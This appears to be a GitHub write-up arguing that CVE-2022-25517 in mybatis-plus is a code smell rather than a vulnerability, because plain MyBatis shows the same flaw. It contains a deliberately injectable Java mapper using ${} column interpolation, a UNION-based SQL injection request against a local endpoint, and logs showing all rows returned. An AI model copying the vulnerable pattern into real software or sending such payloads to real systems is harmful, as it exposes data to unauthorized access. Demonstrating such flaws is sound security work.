# Background
Here is the POC and root cause why CVE-2022-25517 was generated: [POC](https://web.archive.org/web/20220323002637/https://github.com/HaHarden/mybatis-plus-sql-Injection) 

But without mybatis-plus, only using mybatis, we can reproduce the same issue. Please check this demo:
https://github.com/XSun771/demos/tree/mybatis-sql-injection

**By this demo, I want to prove that CVE-2022-25517 should not be an CVE issue. At least if it is, then it is also applicable to Mybatis. Instead, it should be a bad code smell.**

# My POC

## code
```java
@Select("SELECT * FROM ARTICLES WHERE ${columnName} = #{columnValue}")
List<Article> select(@Param("columnName") String columnName, @Param("columnValue") String columnValue);
```

I know you may say , "oh, it is highlighted by Mybatis developers that you should not use `${}` but `#{}` which will check sql injection".

But I must highlight that it is also highlighted in mybatis-plus official documents that everyone needs to do SQL inject check first.

So if you agree that because mybatis developers highlights that you should not use ${} then there is no need to raise CVE issue for mybatis, then why not agree that no need to raise CVE issue to mybatis-plus?

```java
@RequestMapping("/enquiry")
public String enquiry(@RequestBody Enquiry enquiry) {
    return this.articleMapper.select(enquiry.getColumnName(),enquiry.getColumnValue()).toString();
}
```

## attack

I made usage of IDEA http client, the script file is at `src/main/resources/generated-requests.http`.

```
POST http://localhost:9000/enquiry
Content-Type: application/json

{
"columnName": "(id=1) UNION SELECT * FROM ARTICLES WHERE 1=1 OR id",
"columnValue": "1"
}
```

Attachk result:

```
2024-09-16T11:42:48.220+08:00 DEBUG 2736 --- [mybatis-sql-injection] [nio-9000-exec-2] c.e.m.ArticleMapper.select               : ==>  Preparing: SELECT * FROM ARTICLES WHERE (id=1) UNION SELECT * FROM ARTICLES WHERE 1=1 OR id = ?
2024-09-16T11:42:48.229+08:00 DEBUG 2736 --- [mybatis-sql-injection] [nio-9000-exec-2] c.e.m.ArticleMapper.select               : ==> Parameters: 1(String)
2024-09-16T11:42:48.244+08:00 DEBUG 2736 --- [mybatis-sql-injection] [nio-9000-exec-2] c.e.m.ArticleMapper.select               : <==      Total: 3

[Article(id=1, title=foo, author=foo), Article(id=2, title=bar, author=bar), Article(id=3, title=333, author=333)]
```